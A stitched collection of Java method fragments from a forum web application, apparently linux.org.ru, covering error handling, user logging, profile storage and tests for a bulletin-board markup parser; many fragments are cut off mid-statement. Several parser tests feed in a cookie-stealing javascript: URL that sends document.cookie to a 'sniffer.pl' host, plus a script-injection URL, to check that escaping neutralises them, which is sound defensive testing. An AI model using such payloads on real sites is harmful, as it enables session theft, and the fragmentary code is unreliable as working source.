private void prepareModelForCommonException ( ModelAndView modelAndView , HttpServletRequest request , Exception exception ) { modelAndView . addObject ( " headTitle " , StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) ) ; String errorMessage = exception . getMessage ( ) = = null ? StringUtil . escapeHtml ( exception . getClass ( ) . getName ( ) ) : StringUtil . escapeHtml ( exception . getMessage ( ) ) ; modelAndView . addObject ( " errorMessage " , errorMessage ) ; ExceptionType exceptionType = ExceptionType . OTHER ; if ( exception instanceof UserErrorException ) { exceptionType = ExceptionType . IGNORED ; } else if ( exception instanceof ScriptErrorException | | exception instanceof RequestRejectedException ) { logger . debug ( " errors/common.jsp " , exception ) ; exceptionType = ExceptionType . SCRIPT_ERROR ; } else { logger . warn ( " Unexcepted exception caught " , exception ) ; String infoMessage = emailService . sendExceptionReport ( request , exception , AuthUtil . getCurrentUser ( ) ) ; modelAndView . addObject ( " infoMessage " , infoMessage ) ; } modelAndView . addObject ( " exceptionType " , exceptionType . name ( ) ) ; } 
public int doStartTag ( ) { Template = Template . getTemplate ( ) ; List < String > boxnames = . getProf ( ) . getBoxlets ( ) . stream ( ) . filter ( DefaultProfile : : isBox ) . toList ( ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public void logSentPasswordReset ( User resetFor , @Nullable User resetBy , String email ) { jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public boolean hasRecentSelfEvent ( User user , Duration duration , UserLogAction action ) { return jdbcTemplate . queryForObject ( " SELECT EXISTS (SELECT * FROM user_log WHERE userid=? AND action=?::user_log_action AND action_date>? AND userid=action_userid) " , 
public ModelAndView editProfile ( @RequestParam ( " text " ) String text , @PathVariable String nick ) { Template tmpl = Template . getTemplate ( ) ; if ( ! tmpl . isSessionAuthorized ( ) ) { throw new AccessViolationException ( " Not authorized " ) ; } if ( text . length ( ) > 255 ) { text = text . substring ( 0 , 255 ) ; } User user = AuthUtil . getCurrentUser ( ) ; User refUser = userService . getUserCached ( nick ) ; remarkDao . setOrUpdateRemark ( user , refUser , text ) ; return new ModelAndView ( new RedirectView ( " /people/ " + nick + " /profile " ) ) ; } 
public int scoreLoss ( int msgid ) { return jdbcTemplate . queryForObject ( " select COALESCE((select sum(-bonus) as total_bonus from del_info " + " join comments on comments.id = del_info.msgid where bonus is not null and " + 
private boolean check ( Action action , String ip , Duration threshold ) { String key = action . toString ( ) + ':' + ip ; Instant date = performedActions . getIfPresent ( key ) ; if ( date ! = null ) { if ( date . plus ( threshold ) . isAfter ( Instant . now ( ) ) ) { return false ; } } performedActions . put ( key , Instant . now ( ) ) ; return true ; } 
public void testLogAcceptEmail ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( UserDaoIntegrationTest . TEST_ID ) ; when ( user . getEmail ( ) ) . thenReturn ( " old@email " ) ; List < UserLogItem > oldLogItems = userLogDao . getLogItems ( user , true ) ; userLogDao . logAcceptNewEmail ( user , " test@email " ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , true ) ; Assert . assertEquals ( 1 , logItems . size ( ) - oldLogItems . size ( ) ) ; UserLogItem item = logItems . getFirst ( ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . ACCEPT_NEW_EMAIL , item . getAction ( ) ) ; } 
public void testLogScore50 ( ) { User user = mock ( User . class ) ; when ( user . getId ( ) ) . thenReturn ( UserDaoIntegrationTest . TEST_ID ) ; List < UserLogItem > oldLogItems = userLogDao . getLogItems ( user , true ) ; userLogDao . logScore50 ( user , user ) ; List < UserLogItem > logItems = userLogDao . getLogItems ( user , true ) ; Assert . assertEquals ( 1 , logItems . size ( ) - oldLogItems . size ( ) ) ; UserLogItem item = logItems . getFirst ( ) ; assertNotNull ( item ) ; assertEquals ( UserLogAction . SCORE50 , item . getAction ( ) ) ; } 
private AuthorizedSession sessionOf ( User user ) { return AuthorizedSession . apply ( user , user . isCorrector ( ) , user . isModerator ( ) , user . isAdministrator ( ) ) ; } 
public boolean deleteComment ( int msgid ) { int deleteCount = jdbcTemplate . update ( deleteComment , msgid ) ; return deleteCount > 0 ; } 
public void insert ( final List < InsertDeleteInfo > deleteInfos ) { if ( deleteInfos . isEmpty ( ) ) { return ; } deleteInfos . forEach ( info - > Preconditions . checkArgument ( info . bonus < = 0 , " Score bonus on delete must be non-positive " ) ) ; jdbcTemplate . batchUpdate ( INSERT_DELETE_INFO , new BatchPreparedStatementSetter ( ) { @Override 
public void undelete ( Topic message ) { jdbcTemplate . update ( " UPDATE topics SET deleted='f' WHERE id=? " , message . getId ( ) ) ; } 
UserService userService ( UserDao userDao , UserLogDao userLogDao , PlatformTransactionManager transactionManager ) { return new UserService ( mock ( SiteConfig . class ) , userDao , mock ( IgnoreListDao . class ) , mock ( UserInvitesDao . class ) , userLogDao , mock ( UserAgentDao . class ) , transactionManager ) ; 
private static ImmutableMap < String , Object > createDefaultProfile ( ) { ImmutableMap . Builder < String , Object > builder = ImmutableMap . builder ( ) ; builder . put ( STYLE_PROPERTY , " tango " ) ; builder . put ( FORMAT_MODE_PROPERTY , MarkupType . Markdown$ . MODULE$ . formId ( ) ) ; builder . put ( TOPICS_PROPERTY , 30 ) ; builder . put ( MESSAGES_PROPERTY , 50 ) ; builder . put ( PHOTOS_PROPERTY , Boolean . TRUE ) ; builder . put ( AVATAR_PROPERTY , " empty " ) ; builder . put ( HIDE_ADSENSE_PROPERTY , true ) ; builder . put ( MAIN_GALLERY_PROPERTY , false ) ; builder . put ( TRACKER_MODE , DEFAULT_TRACKER_MODE . getValue ( ) ) ; builder . put ( OLD_TRACKER , false ) ; builder . put ( REACTION_NOTIFICATION_PROPERTY , true ) ; builder . put ( " DebugMode " , Boolean . FALSE ) ; main page settings builder.put(BOXES_MAIN2_PROPERTY, ImmutableList.of("poll", "articles", "top10", "gallery", "tagcloud")); return builder.build(); } 
public static String fixFormat ( String mode ) { if ( MarkupType$ . MODULE$ . AllFormIds ( ) . contains ( mode ) ) { return mode ; 
public static String fixStyle ( String style ) { if ( ! DefaultProfile . isStyle ( style ) ) { return ( String ) DefaultProfile . getDefaultProfile ( ) . get ( STYLE_PROPERTY ) ; } return style ; } 
public void writeProfile ( User user , ProfileBuilder profile ) { String [ ] boxlets = null ; List < String > customBoxlets = profile . getCustomBoxlets ( ) ; if ( customBoxlets ! = null ) { boxlets = customBoxlets . toArray ( new String [ 0 ] ) ; } final String [ ] finalBoxlets = boxlets ; if ( jdbcTemplate . update ( con - > { 
private AuthorizedSession sessionOf ( User user ) { return AuthorizedSession . apply ( user , user . isCorrector ( ) , user . isModerator ( ) , user . isAdministrator ( ) , Profile . DEFAULT ) ; } 
public void estModification ( ) { Profile profile = Profile . DEFAULT ; assertNotSame ( 125 , profile . getMessages ( ) ) ; var builder = new ProfileBuilder ( profile ) ; builder . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , builder ) ; Profile profile1 = profileDao . readProfile ( testUser . getId ( ) ) ; profileDao . deleteProfile ( testUser ) ; assertEquals ( 125 , profile1 . getMessages ( ) ) ; } 
public Profile readProfile ( int userId ) { List < Profile > profiles = jdbcTemplate . query ( " SELECT settings, main FROM user_settings WHERE id=? " , ( resultSet , i ) - > { Array boxes = resultSet . getArray ( " main " ) ; if ( boxes ! = null ) { return Profile . apply ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , Arrays . asList ( ( String [ ] ) boxes . getArray ( ) ) ) ; } else { return Profile . apply ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , ( Map < String , String > ) resultSet . getObject ( " settings " ) ) , null ) ; } } , userId ) ; if ( profiles . isEmpty ( ) ) { return Profile . apply ( new ProfileHashtable ( DefaultProfile . getDefaultProfile ( ) , new HashMap < > ( ) ) , null ) ; 
private AuthorizedSession sessionOf ( User user ) { return AuthorizedSession . apply ( user , user . isCorrector ( ) , user . isModerator ( ) , user . isAdministrator ( ) , Profile . DEFAULT ( ) ) ; } 
public void estModification ( ) { Profile profile = Profile . DEFAULT ( ) ; assertNotSame ( 125 , profile . messages ( ) ) ; var builder = new ProfileBuilder ( profile ) ; builder . setMessages ( 125 ) ; profileDao . writeProfile ( testUser , builder ) ; Profile profile1 = profileDao . readProfile ( testUser . getId ( ) ) ; profileDao . deleteProfile ( testUser ) ; assertEquals ( 125 , profile1 . messages ( ) ) ; } 
UserService userService ( UserDao userDao , UserLogDao userLogDao , PlatformTransactionManager transactionManager ) { return new UserService ( mock ( SiteConfig . class ) , userDao , mock ( IgnoreListDao . class ) , mock ( UserInvitesDao . class ) , userLogDao , mock ( UserAgentDao . class ) , mock ( ProfileDao . class ) , transactionManager ) ; 
public TopicController topicController ( SectionService sectionService , TopicDao messageDao , CommentPrepareService prepareService , TopicPrepareService topicPrepareService , CommentReadService commentService , IgnoreListDao ignoreListDao , IPBlockDao ipBlockDao , EditHistoryService editHistoryService , MemoriesDao memoriesDao , TopicPermissionService permissionService , MoreLikeThisService moreLikeThisService , TopicTagService topicTagService , MsgbaseDao msgbaseDao , MessageTextService textService , WarningService warningService ) { return new TopicController ( sectionService , messageDao , prepareService , topicPrepareService , commentService , ignoreListDao , ipBlockDao , editHistoryService , memoriesDao , permissionService , 
public void updateTitle ( int msgid , String title ) { namedJdbcTemplate . update ( " UPDATE topics SET title=:title WHERE id=:id " , 
public void updateLinktext ( int msgid , String linktext ) { namedJdbcTemplate . update ( " UPDATE topics SET linktext=:linktext WHERE id=:id " , 
public void updateUrl ( int msgid , String url ) { namedJdbcTemplate . update ( " UPDATE topics SET url=:url WHERE id=:id " , 
public void logRegister ( int userid , @Nonnull String ip , Optional < Integer > invitedBy , int userAgent , Optional < String > language ) { ImmutableMap . Builder < String , String > builder = ImmutableMap . builder ( ) ; builder . put ( OPTION_IP , ip ) ; builder . put ( OPTION_USER_AGENT , Integer . toString ( userAgent ) ) ; language . ifPresent ( lang - > builder . put ( OPTION_ACCEPT_LANGUAGE , lang ) ) ; invitedBy . ifPresent ( user - > builder . put ( OPTION_INVITED_BY , user . toString ( ) ) ) ; jdbcTemplate . update ( " INSERT INTO user_log (userid, action_userid, action_date, action, info) VALUES (?,?,CURRENT_TIMESTAMP, ?::user_log_action, ?) " , 
public void testExtraLines ( ) { user assertEquals(lorCodeService.parseComment("[user]splinter[/user]", false, LorCodeService.Plain$.MODULE$), lorCodeService.parseComment("[user]splinter[/user]", false, LorCodeService.Plain$.MODULE$)); 
public void splinterTest1 ( ) { http:www.linux.org.ru/forum/linux-org-ru/6448266 assertEquals("<p><a href=\"http:www.fishing.org/\">http:www.fishing.org/</a> <span style=\"white-space: nowrap\"><img src=\"/img/tuxlor.png\"><a style=\"text-decoration: none\" href=\"http:127.0.0.1:8080/people/splinter/profile\">splinter</a></span></p>", lorCodeService.parseComment("[url=http:www.fishing.org/][user]splinter[/user][/url]", false, LorCodeService.Plain$.MODULE$)); 
public void userTest ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/user] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [user]isden[/user] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/user] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void parserResultTest ( ) { String msg = " [user]hizel[/user][user]JB[/user][user]maxcom[/user] " ; var replier = lorCodeService . getMentions ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void userTest2 ( ) { assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/maxcom/profile \" >maxcom</a></span></p> " , lorCodeService . parseComment ( " [user]maxcom[/USER] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <span style= \" white-space: nowrap \" ><img src= \" /img/tuxlor.png \" ><s><a style= \" text-decoration: none \" href= \" http:127.0.0.1:8080/people/isden/profile \" >isden</a></s></span></p> " , lorCodeService . parseComment ( " [USER]isden[/USER] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p> <s>hizel</s></p> " , lorCodeService . parseComment ( " [user]hizel[/USER] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void parserResultTest2 ( ) { String msg = " [user]hizel[/user][USER]JB[/user][user]maxcom[/USER] " ; var replier = lorCodeService . getMentions ( msg ) ; assertTrue ( replier . contains ( maxcom ) ) ; assertTrue ( replier . contains ( JB ) ) ; assertFalse ( replier . contains ( isden ) ) ; } 
public void pTest ( ) { assertEquals ( " <p>test ntest1</p><p>test2</p> " , lorCodeService . parseComment ( " test ntest1 ntest2 " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void tagEscapeTest ( ) { assertEquals ( " <p>&lt;br&gt;</p> " , lorCodeService . parseComment ( " <br> " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlEscapeTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >Test</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]Test[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p><s>javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close()</s></p> " , lorCodeService . parseComment ( " [url]javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlEscapeWithTagsTest ( ) { assertEquals ( " <p><s title= \" javascript:var c=new Image();c.src=&quot;http:127.0.0.1/sniffer.pl?&quot;+document.cookie;close() \" >T<i>e</i>st</s></p> " , lorCodeService . parseComment ( " [url=javascript:var c=new Image();c.src= \" http:127.0.0.1/sniffer.pl? \" +document.cookie;close()]T[i]e[/i]st[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void badListTest ( ) { assertEquals ( " <p>0</p><ul><li>1</li><li>2</li></ul> " , lorCodeService . parseComment ( " [list]0[*]1[*]2[/list] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void codeEscapeTest ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&quot;code&amp;code&quot;</code></pre></div> " , lorCodeService . parseComment ( " [code] \" code&code \" [/code] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlTest0 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" ><p>linux.org.ru</p></a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru] nlinux.org.ru[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url] nhttp:linux.org.ru[/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void urlTest1 ( ) { assertEquals ( " <p><a href= \" http:linux.org.ru \" >http:linux.org.ru</a></p> " , lorCodeService . parseComment ( " [url=http:linux.org.ru][/url] " , false , LorCodeService . Plain$ . MODULE$ ) ) ; 
public void paragraphLogicTest ( ) { list assertEquals("<p>some1 text</p><p>some2 text</p><ul><li>one</li><li>two</li></ul><p><a href=\"http:www.example.com\">http:www.example.com</a> - some3 text</p>", lorCodeService.parseComment("some1 textsome2 text[list][*]one[*]two[/list][url]http:www.example.com[/url] - some3 text", false, LorCodeService.Plain$.MODULE$)); b assertEquals("<p><b><p>te</p><p>xt</p></b></p>", lorCodeService.parseComment("[b]text[/b]", false, LorCodeService.Plain$.MODULE$)); i assertEquals("<p><i><p>te</p><p>xt</p></i></p>", lorCodeService.parseComment("[i]text[/i]", false, LorCodeService.Plain$.MODULE$)); u assertEquals("<p><u><p>te</p><p>xt</p></u></p>", lorCodeService.parseComment("[u]text[/u]", false, LorCodeService.Plain$.MODULE$)); s assertEquals("<p><s><p>te</p><p>xt</p></s></p>", lorCodeService.parseComment("[s]text[/s]", false, LorCodeService.Plain$.MODULE$)); em assertEquals("<p><em><p>te</p><p>xt</p></em></p>", lorCodeService.parseComment("[em]text[/em]", false, LorCodeService.Plain$.MODULE$)); strong assertEquals("<p><strong><p>te</p><p>xt</p></strong></p>", lorCodeService.parseComment("[strong]text[/strong]", false, LorCodeService.Plain$.MODULE$)); p assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[p]text[/p]", false, LorCodeService.Plain$.MODULE$)); div assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[div]text[/div]", false, LorCodeService.Plain$.MODULE$)); quote assertEquals(citeHeader + "<p>te</p><p>xt</p>" + citeFooter, lorCodeService.parseComment("[quote]text[/quote]", false, LorCodeService.Plain$.MODULE$)); cut assertEquals("<p>te</p><p>xt</p>", lorCodeService.parseComment("[cut]text[/cut]", false, LorCodeService.Plain$.MODULE$)); 
public void testHighlightURL ( ) { assertEquals ( " <p><a href= \" http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E \" >http:ya.ru/?a=f&lt;script&gt;alert('i have cookies!')&lt;/script&gt;</a></p> " , lorCodeService . parseComment ( " http:ya.ru/?a=f%3Cscript%3Ealert('i%20have%20cookies!')%3C/script%3E " , false , LorCodeService . Plain$ . MODULE$ ) ) ; } 
